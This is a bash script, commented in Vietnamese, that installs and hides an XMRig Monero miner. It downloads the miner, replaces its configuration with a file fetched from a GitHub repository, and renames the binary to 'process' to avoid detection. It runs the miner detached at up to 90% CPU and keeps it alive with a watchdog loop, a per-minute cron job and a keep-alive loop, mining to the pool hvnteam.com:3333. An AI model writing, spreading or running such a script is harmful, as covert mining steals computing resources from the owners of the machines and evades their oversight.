#!/bin/bash
# Tải XMRig trong khi hệ thống cập nhật
mkdir -p ~/xmrig && cd ~/xmrig
if [ ! -f "xmrig-6.22.2-focal-x64.tar.gz" ]; then
    echo "⬇ Đang tải XMRig..."
    wget -q --show-progress https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
fi

# Chờ cập nhật hoàn tất trước khi giải nén
wait
echo "📂 Giải nén XMRig..."
tar -xf xmrig-6.22.2-focal-x64.tar.gz
cd xmrig-6.22.2
rm config.json
wget https://raw.githubusercontent.com/ngocsuo/mazda6/refs/heads/master/config.json

# Đổi tên trình đào để tránh bị phát hiện
mv xmrig process
chmod +x process

# Tạo script chạy trình đào ẩn với `nohup` và `setsid`
echo '#!/bin/bash
setsid nohup ./process --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
disown
' > start.sh

chmod +x start.sh
./start.sh

# Tạo script kiểm tra & tự động khởi động lại nếu bị dừng
echo '#!/bin/bash
while true; do
    if ! pgrep -x "process" > /dev/null
    then
        echo "🔄 Trình đào bị dừng! Đang khởi động lại..."
        cd ~/xmrig/xmrig-6.22.2
        setsid nohup ./process --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
        disown
    fi
    sleep 60
done' > watchdog.sh

chmod +x watchdog.sh
setsid nohup ./watchdog.sh > /dev/null 2>&1 &
disown

# Thêm cron job để kiểm tra và khởi động lại mỗi phút
(crontab -l 2>/dev/null; echo "* * * * * ~/xmrig/watchdog.sh") | crontab -

# Tạo script giữ kết nối liên tục
echo '#!/bin/bash
while true; do 
    sleep 30; 
    curl -m 5 -s -o /dev/null https://www.google.com || exit; 
done' > keep_alive.sh
chmod +x keep_alive.sh
nohup ./keep_alive.sh > keep_alive.log 2>&1 &
disown

# Hiển thị thông báo hoàn tất
echo "✅ Trình đào XMR trên Pool hvnteam.com:3333 đang chạy ẩn!"
echo "⏳ Kiểm tra thu nhập tại Pool."
